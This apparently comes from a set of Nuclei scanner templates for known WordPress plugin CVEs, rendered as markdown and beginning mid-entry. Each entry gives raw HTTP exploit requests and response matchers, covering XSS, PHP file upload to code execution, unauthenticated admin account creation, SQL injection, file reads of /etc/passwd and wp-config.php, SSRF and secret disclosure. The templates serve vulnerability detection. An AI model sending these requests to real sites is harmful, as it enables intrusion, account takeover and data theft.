  3. contains(body_1, 'users_can_register')
  4. contains(body_2, 'default_role')
- condition - and

---

# WordPress GDPR & CCPA \<1.9.27 - Cross-Site Scripting

## Description

- WordPress GDPR & CCPA plugin before 1.9.27 contains a cross-site scripting vulnerability. The check_privacy_settings AJAX action, available to both unauthenticated and authenticated users, responds with JSON data without an "application/json" content-type, and JavaScript code may be executed on a victim's browser.

- severity - medium
- tags - wpscan,cve,cve2022,wordpress,wp-plugin,wp,xss,unauth

## Requests

### Step - 1

```
GET /wp-admin HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=check_privacy_settings&settings%5B40%5D=40&settings%5B41%5D=%3cbody%20onload%3dalert(document.domain)%3e&nonce={{nonce}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, 'text/html')
  2. status_code_2 == 200
  3. contains(body_2, '\<body onload=alert(document.domain)>') && contains(body_2, '/wp-content/plugins/')
- condition - and

### Extractors

**Type - regex**

- name - nonce
- part - body
- group - 1
- regex
  1. nonce":"([0-9a-z]+)
- internal - True

---

# WordPress Contact Form 7 \<1.3.6.3 - Stored Cross-Site Scripting

## Description

- WordPress Contact Form 7 before 1.3.6.3 contains an unauthenticated stored cross-site scripting vulnerability in the Drag and Drop Multiple File Upload plugin. SVG files can be uploaded by default via the dnd_codedropz_upload AJAX action.

- severity - medium
- tags - cve,cve2022,xss,wordpress,wp-plugin,wpscan,fileupload,intrusive,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161

-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="size_limit"

10485760
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="type"

click
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
Content-Type: image/jpeg

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-----------------------------92633278134516118923780781161--

```

### Step - 2

```
GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.svg HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "alert(document.domain)")
  2. status_code_2 == 200
- condition - and

---

# WordPress Contact Form 7 Captcha \<0.1.2 - Cross-Site Scripting

## Description

- WordPress Contact Form 7 Captcha plugin before 0.1.2 contains a reflected cross-site scripting vulnerability. It does not escape the $\_SERVER['REQUEST_URI'] parameter before outputting it back in an attribute.

- severity - medium
- tags - wpscan,cve,cve2022,wordpress,xss,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/options-general.php?page=cf7sr_edit&">\</script>\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>
  2. Contact Form 7
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# eaSYNC \< 1.1.16 - Unauthenticated Arbitrary File Upload

## Description

- The Free Booking Plugin for Hotels, Restaurant and Car Rental WordPress plugin before 1.1.16 suffers from insufficient input validation which leads to arbitrary file upload and subsequently to remote code execution. An AJAX action accessible to unauthenticated users is affected by this issue. An allowlist of valid file extensions is defined but is not used during the validation steps.

- severity - critical
- tags - cve,cve2022,wpscan,wordpress,easync-booking,unauth,wp,file-upload,wp-plugin,intrusive

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=a0d5959357e474aef655313f69891f37
Content-Type: multipart/form-data; boundary=------------------------98efee55508c5059

--------------------------98efee55508c5059
Content-Disposition: form-data; name="action"

easync_session_store
--------------------------98efee55508c5059
Content-Disposition: form-data; name="type"

car
--------------------------98efee55508c5059
Content-Disposition: form-data; name="with_driver"

self-driven
--------------------------98efee55508c5059
Content-Disposition: form-data; name="driver_license_image2"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

<?php echo md5('CVE-2022-1952');?>

--------------------------98efee55508c5059--

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?action=easync_success_and_save HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=a0d5959357e474aef655313f69891f37

```

### Step - 3

```
GET /wp-content/uploads/{{filename}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_3, "text/html")
  2. status_code_3 == 200
  3. contains(body_1, 'success\":true')
  4. contains(body_3, 'e0d7fcf2c9f63143b6278a3e40f6bea9')
- condition - and

### Extractors

**Type - regex**

- name - filename
- group - 1
- regex
  1. wp-content\\\/uploads\\\/([0-9a-zA-Z]+).php
- internal - True

---

# WordPress Mapping Multiple URLs Redirect Same Page \<=5.8 - Cross-Site Scripting

## Description

- WordPress Mapping Multiple URLs Redirect Same Page plugin 5.8 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the mmursp_id parameter before outputting it back in an admin page.

- severity - medium
- tags - cve,cve2022,wordpress,wp-plugin,xss,wp,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. id="mmursp_id" value="\">\<svg/onload=alert(document.domain)>" />

**Type - dsl**

- dsl
  1. status_code_2 == 200
  2. contains(all_headers_2, "text/html")
- condition - and

---

# Cookie Information \< 2.0.8 - Reflected Cross-Site Scripting

## Description

- The Cookie Information plugin does not escape user data before outputting it back in attributes in the admin dashboard, leading to a Reflected Cross-Site Scripting issue

- severity - medium
- tags - cve2022,wordpress,xss,wp,authenticated,cve,wp-plugin,wp-gdpr-compliance,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/admin.php?page=wp-gdpr-compliance&x=%27+onanimationstart%3Dalert%28document.domain%29+style%3Danimation-name%3Arotation+x  HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. x=\' onanimationstart=alert(document.domain) style=animation-name:rotation x'
  2. toplevel_page_wp-gdpr-compliance
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# MasterStudy LMS plugin \< 2.7.6 - Unauthenticated Admin Account Creation

## Description

- The MasterStudy LMS WordPress plugin before 2.7.6 does to validate some parameters given when registering a new account, allowing unauthenticated users to register as an admin.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wpscan,wp,unauth

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce={{nonce}} HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json

{"user_login":"{{username}}","user_email":"{{user_email}}","user_password":"{{password}}","user_password_re":"{{password}}","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. Registration completed successfully
  2. "status":"success"
- condition - and

**Type - word**

- part - header_2
- words
  1. application/json;

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - nonce
- group - 1
- regex
  1. "stm_lms_register":"([0-9a-z]+)"
- internal - True

**Type - kval**

- kval
  1. user_email
  2. password

---

# WordPress Plugin Metform \<= 2.1.3 - Unauthenticated Sensitive Information Disclosure

## Description

- The Metform WordPress plugin is vulnerable to sensitive information disclosure due to improper access control in the ~/core/forms/action.php file which can be exploited by an unauthenticated attacker to view all API keys and secrets of integrated third-party APIs like that of PayPal, Stripe, Mailchimp, Hubspot, HelpScout, reCAPTCHA and many more, in versions up to and including 2.1.3.

- severity - high
- tags - wpscan,cve2022,wordpress,wp-plugin,disclosure,unauth,metform,cve,wp

## Requests

### Step - 1

```
GET /wp-json/metform/v1/forms/templates/0 HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-json/metform/v1/forms/get/{{id}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. mf_recaptcha_secret_key
  2. admin_email_from
- condition - and

**Type - word**

- part - header_2
- words
  1. application/json

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - id
- group - 1
- regex
  1. \<option value=\"([0-9]+)\"
- internal - True

---

# WordPress XML Sitemap Generator for Google \<2.0.4 - Cross-Site Scripting

## Description

- WordPress XML Sitemap Generator for Google plugin before 2.0.4 contains a vulnerability that can lead to cross-site scripting or remote code execution. It does not validate a parameter which can be set to an arbitrary value, thus causing cross-site scripting via error message or remote code execution if allow_url_include is turned on.

- severity - medium
- tags - wpscan,cve,cve2022,wp,wordpress,wp-plugin,xss,www-xml-sitemap-generator-org

## Requests

- Method - GET

### URL

- {{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp
- {{BaseURL}}/?p=1&xsg-provider=data://text/html,\<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp

### Matchers

**Type - word**

- part - body_1
- words
  1. \<img src onerror=alert(document.domain)>
  2. Invalid Provider type specified
- condition - and

**Type - word**

- part - body_2
- words
  1. 2ef3baa95802a4b646f2fc29075efe34

---

# Sensei LMS \< 4.5.0 - Unauthenticated Private Messages Disclosure

## Description

- The Sensei LMS WordPress plugin before 4.5.0 does not have proper permissions set in one of its REST endpoint, allowing unauthenticated users to access private messages sent to teachers

- severity - medium
- tags - wp,disclosure,wpscan,cve,cve2022,sensei-lms,fuzz,hackerone,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/wp/v2/sensei-messages/{{num}}

### Matchers

**Type - word**

- part - body
- words
  1. sensei_message
  2. guid":{"rendered":
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

**Payloads**- num

---

# WordPress Simple Membership \<4.1.1 - Cross-Site Scripting

## Description

- WordPress Simple Membership plugin before 4.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape parameters before outputting them back in AJAX actions.
- severity - medium
- tags - xss,wp,wordpress,wpscan,cve,cve2022,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=swpm_validate_email&fieldId=%22%3Cscript%3Ealert(document.domain)%3C/script%3E

### Matchers

**Type - word**

- part - body
- words
  1. "\<script>alert(document.domain)\</script>",

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Fusion Builder \< 3.6.2 - Unauthenticated SSRF

## Description

- The plugin, used in the Avada theme, does not validate a parameter in its forms which could be used to initiate arbitrary HTTP requests. The data returned is then reflected back in the application's response. This could be used to interact with hosts on the server's local network bypassing firewalls and access control measures.

- severity - critical
- tags - wpscan,cve,cve2022,wordpress,ssrf,themefusion,wp,fusion,avada

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: {{BaseURL}}
Referer: {{RootURL}}

action=fusion_form_update_view

```

### Step - 2

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------30259827232283860776499538268
Origin: {{BaseURL}}
Referer: {{RootURL}}

-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="formData"

email=example%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&priva
cy_expiration_action=ignore&fusion-form-nonce-0={{fusionformnonce}}&fusion-fields-hold-private-data=
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="action"

fusion_form_submit_form_to_url
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusion_form_nonce"

{{fusionformnonce}}
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="form_id"

0
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="post_id"

0
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="field_labels"

{"email":"Email address"}
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="hidden_field_names"

[]
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusionAction"

https://oast.me
-----------------------------30259827232283860776499538268
Content-Disposition: form-data; name="fusionActionMethod"

GET
-----------------------------30259827232283860776499538268--

```

### Matchers

**Type - word**

- part - body_2
- words
  1. Interactsh Server

**Type - status**

- status
  1. 200

### Extractors

**Type - xpath**

- part - body_1
- name - fusionformnonce
- attribute - value
- xpath
  1. //\*[@id="fusion-form-nonce-0"]
- internal - True

---

# BadgeOS \< 3.7.1 - Unauthenticated SQL Injection

## Description

- The BadgeOS WordPress plugin through 3.7.0 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action, leading to an SQL Injection exploitable by unauthenticated users.

- severity - critical
- tags - cve2022,wp,unauth,sqli,cve,wp-plugin,badgeos,wpscan,wordpress

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5({{num}}),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

```

### Matchers

**Type - dsl**

- dsl
  1. status_code == 200
  2. contains(body, md5(num))
  3. contains(content_type, "application/json")
  4. contains(body, "badgeos-arrange-buttons")
- condition - and

---

# WordPress Narnoo Distributor \<=2.5.1 - Local File Inclusion

## Description

- WordPress Narnoo Distributor plugin 2.5.1 and prior is susceptible to local file inclusion. The plugin does not validate and sanitize the lib_path parameter before being passed into a call to require() via the narnoo_distributor_lib_request AJAX action, and the content of the file is displayed in the response as JSON data. This can also lead to a remote code execution vulnerability depending on system and configuration.

- severity - critical
- tags - narnoo-distributor,cve,cve2022,wordpress,wp-plugin,wpscan,wp,rce,unauth,lfi

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=narnoo_distributor_lib_request&lib_path=/etc/passwd

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WPB Show Core - Cross-Site Scripting

## Description

- The WPB Show Core WordPress plugin through TODO does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - wpscan,cve,cve2022,wp-plugin,wp,wordpress,xss,wpb-show-core

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php?audioPlayerOption=1&fileList[0][title]=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - dsl**

- dsl
  1. status_code == 200
  2. contains(content_type, "text/html")
  3. contains(body, "wpb_jplayer_setting")
  4. contains(body, "\<script>alert(document.domain)\</script>")
- condition - and

---

# Active Products Tables for WooCommerce \< 1.0.5 - Cross Site Scripting

## Description

- The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected cross-Site Scripting.

- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2022,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\u003cscript%3Ealert(document.domain)\u003c/script%3E%22}

### Matchers

**Type - word**

- part - body
- words
  1. \<script>alert(document.domain)\</script>

**Type - word**

- part - body
- words
  1. woot-content-in-popup
  2. woot-system
  3. woot-table
- condition - or

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Plugin MapPress \<2.73.4 - Cross-Site Scripting

## Description

- WordPress Plugin MapPress before version 2.73.4 does not sanitize and escape the 'mapid' parameter before outputting it back in the "Bad mapid" error message, leading to reflected cross-site scripting.

- severity - medium
- tags - cve2022,mappress,xss,wordpress,wp-plugin,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

**Type - word**

- part - body
- words
  1. \<img src onerror=alert(document.domain)>
  2. Bad mapid
- condition - and

---

# Easy Student Results \<= 2.2.8 - Information Disclosure

## Description

- The Easy Student Results WordPress plugin through 2.2.8 lacks authorisation in its REST API, allowing unauthenticated users to retrieve information related to the courses, exams, departments as well as student's grades and PII such as email address, physical address, phone number etc.

- severity - high
- tags - wordpress,wp-plugin,wp,easy-student-results,disclosure,wpscan,cve,cve2022

## Requests

### Step - 1

```
GET /wp-json/rps_result/v1/route/student_fields HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-json/rps_result/v1/route/search_student?department_id=1&batch_id=1 HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_1
- words
  1. "departments":
  2. batches":
- condition - and

**Type - word**

- part - body_2
- words
  1. meta_data
  2. "name":"
  3. "registration_no":
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Page Views Count \< 2.4.15 - Unauthenticated SQL Injection

## Description

- Unauthenticated SQL Injection in WordPress Page Views Count Plugin (versions \< 2.4.15).

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,unauth

## Requests

### Step - 1

```
GET /?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. {{md5(num)}}

**Type - status**

- status
  1. 200

---

# WordPress RSS Aggregator \< 4.20 - Authenticated Cross-Site Scripting

## Description

- WordPress RSS Aggregator \< 4.20 is susceptible to cross-site scripting. The plugin does not sanitize and escape the id parameter in the wprss_fetch_items_row_action AJAX action before outputting it back in the response, leading to reflected cross-site scripting.
- severity - medium
- tags - wpscan,cve,cve2022,wordpress,xss,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

id=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E

```

### Matchers

**Type - word**

- part - body
- words
  1. \<img src onerror=alert(`document.domain`)>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Accessibility Helper \<0.6.0.7 - Cross-Site Scripting

## Description

- WordPress Accessibility Helper plugin before 0.6.0.7 contains a cross-site scripting vulnerability. It does not sanitize and escape the wahi parameter before outputting back its base64 decode value in the page.

- severity - medium
- tags - wordpress,wp-plugin,wp,wpscan,cve,cve2022,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v

### Matchers

**Type - word**

- part - body
- words
  1. var wah_target_src = '';alert(document.domain);//';

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Visual Form Builder \<3.0.8 - Cross-Site Scripting

## Description

- WordPress Visual Form Builder plugin before 3.0.8 contains a cross-site scripting vulnerability. The plugin does not perform access control on entry form export, allowing an unauthenticated user to export the form entries as CSV files using the vfb-export endpoint.

- severity - medium
- tags - wpscan,cve,cve2022,xss,wordpress

## Requests

### Step - 1

```
POST /wp-admin/admin.php?page=vfb-export HTTP/1.1
Host: {{Hostname}}
Referer: {{RootURL}}/wp-admin/admin.php?page=vfb-export
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}

vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File

```

### Matchers

**Type - word**

- words
  1. "Date Submitted"
  2. "Entries ID"
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Gwyn's Imagemap Selector \<=0.3.3 - Cross-Site Scripting

## Description

- Wordpress Gwyn's Imagemap Selector plugin 0.3.3 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize the id and class parameters before returning them back in attributes.

- severity - medium
- tags - cve2022,wpscan,xss,wordpress,wp-plugin,wp,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script> popup-

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# CDI \< 5.1.9 - Cross Site Scripting

## Description

- The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - cdi,wpscan,cve,cve2022,wp-plugin,wp,wordpress,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=cdi_collect_follow&trk=%3Cscript%3Ealert(document.domain)%3C/script%3E

### Matchers

**Type - word**

- part - body
- words
  1. \<script>alert(document.domain)\</script>
  2. Tracking code not correct
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Awin Data Feed \<=1.6 - Cross-Site Scripting

## Description

- WordPress Awin Data Feed plugin 1.6 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action, available to both unauthenticated and authenticated users.

- severity - medium
- tags - cve,cve2022,xss,awin,wpscan,wp-plugin,wp,wordpress,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?action=get_sw_product&title=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, "text/html")
  2. status_code_2 == 200
  3. contains(body_2, 'colspan=\"2\">\<script>alert(document.domain)\</script>\</th>')
- condition - and

---

# ARPrice Lite \< 3.6.1 - Unauthenticated SQLi

## Description

- The Pricing Table WordPress plugin before 3.6.1 fails to properly sanitize and escape user supplied POST data before it is being interpolated in an SQL statement and then executed via an AJAX action available to unauthenticated users.

- severity - critical
- tags - unauth,wp,cve2022,wordpress,wp-plugin,arprice-responsive-pricing-table,sqli,wpscan,cve

## Requests

### Step - 1

```
@timeout: 10s
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)

```

### Step - 2

```
GET /wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration_1>=6
  2. status_code_1 == 200
  3. contains(content_type_1, "text/html")
  4. contains(body_2, "ArpPriceTable")
- condition - and

---

# WordPress White Label CMS \<2.2.9 - Cross-Site Scripting

## Description

- WordPress White Label CMS plugin before 2.2.9 contains a reflected cross-site scripting vulnerability. It does not sanitize and validate the wlcms[_login_custom_js] parameter before outputting it back in the response while previewing.

- severity - medium
- tags - cve,cve2022,wordpress,xss,wp-plugin,wpscan

## Requests

### Step - 1

```
POST /wp-login.php?wlcms-action=preview HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

wlcms%5B_login_custom_js%5D=alert%28%2FXSS%2F%29%3B

```

### Matchers

**Type - word**

- part - body
- words
  1. alert(/XSS/);

**Type - word**

- part - body
- words
  1. wlcms-login-wrapper

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# RSVP and Event Management \< 2.7.8 - Unauthenticated Entries Export

## Description

- The RSVP and Event Management Plugin WordPress plugin before 2.7.8 does not have any authorisation checks when exporting its entries, and has the export function hooked to the init action. As a result, unauthenticated attackers could call it and retrieve PII such as first name, last name and email address of user registered for events
- severity - medium
- tags - wordpress,cve,cve2022,wpscan,wp,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=rsvp-admin-export

### Matchers

**Type - word**

- part - body
- words
  1. RSVP Status
  2. "First Name"
- condition - and

**Type - status**

- status
  1. 200

---

# Duplicator \< 1.4.7 - Unauthenticated Backup Download

## Description

- The Duplicator WordPress plugin before 1.4.7 discloses the url of the a backup to unauthenticated visitors accessing the main installer endpoint of the plugin, if the installer script has been run once by an administrator, allowing download of the full site backup without authenticating.

- severity - high
- tags - cve2022,wordpress,wp,wp-plugin,duplicator,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?is_daws=1
- {{BaseURL}}/wp-content/dup-installer/main.installer.php?is_daws=1

### Matchers

- condition - and

**Type - word**

- part - body
- words
  1. \<a href='../installer.php'>restart this install process\</a>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Slider Revolution - Local File Disclosure

## Description

- Directory traversal vulnerability in the Elegant Themes Divi theme for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the img parameter in a revslider_show_image action to wp-admin/admin-ajax.php. NOTE: this vulnerability may be a duplicate of CVE-2014-9734.

- severity - high
- tags - wordpress,wp-plugin,lfi,revslider,wp,wpscan,cve,cve2015

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
- {{BaseURL}}/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. 'DB_NAME'
  2. 'DB_PASSWORD'
  3. 'DB_USER'
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Zip Attachments \<= 1.1.4 - Arbitrary File Retrieval

## Description

- WordPress zip-attachments plugin allows arbitrary file retrieval as it does not check the download path of the requested file.
- severity - high
- tags - cve2015,wp-plugin,wpscan,lfi,wordpress,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../etc/passwd&za_filename=passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress StageShow \<5.0.9 - Open Redirect

## Description

- WordPress StageShow plugin before 5.0.9 contains an open redirect vulnerability in the Redirect function in stageshow_redirect.php. A remote attacker can redirect users to arbitrary web sites and conduct phishing attacks via a malicious URL in the url parameter.
- severity - medium
- tags - wpscan,seclists,redirect,cve,cve2015,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Finteract.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Symposium \<=15.8.1 - Cross-Site Scripting

## Description

- WordPress Symposium through 15.8.1 contains a reflected cross-site scripting vulnerability via the wp-content/plugins/wp-symposium/get_album_item.php?size parameter which allows an attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - xss,wpscan,cve,cve2015,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-symposium/get_album_item.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Church Admin \<0.810 - Cross-Site Scripting

## Description

- WordPress Church Admin plugin before 0.810 allows remote attackers to inject arbitrary web script or HTML via the address parameter via index.php/2015/05/21/church_admin-registration-form/.

- severity - medium
- tags - wp-plugin,wp,edb,wpscan,cve,cve2015,wordpress,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/church-admin/includes/validate.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

